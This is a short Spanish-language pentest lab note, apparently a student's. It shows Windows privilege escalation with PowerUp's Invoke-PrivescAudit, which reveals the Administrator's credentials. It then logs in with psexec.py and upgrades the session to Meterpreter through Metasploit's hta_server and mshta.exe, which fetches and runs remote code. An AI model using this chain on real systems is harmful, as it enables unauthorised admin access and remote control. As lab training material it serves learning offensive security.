Descripción

En el ejemplo se ha ejecutado así (el script estaba en C:\Users\student\Desktop\Powersploit\Privesc):

```powershell
. .\PowerUp.ps1
Invoke-PrivescAudit
```

Ejemplo de salida:
![[Pasted image 20250213092857.png]]

Aquí se pueden observar las credenciales del usuario Administrador. Podemos intentar iniciar sesión mediante.

```bash
psexec.py administrator@ip
```

Y así obtener una shell interactiva con permisos de administrador. También podemos lograr a partir de esta shell un meterpreter. Para ello vamos a metasploit.

```bash
msfconsole
use exploit/windows/misc/hta_server
configure
exploit
```

Esto nos dará una url que tenemos que utilizar en la shell con permisos de administrador de windows.

```powershell
mshta.exe url
```

Y si volvemos a metasploit ya tendremos nuestra sesión con meterpreter.
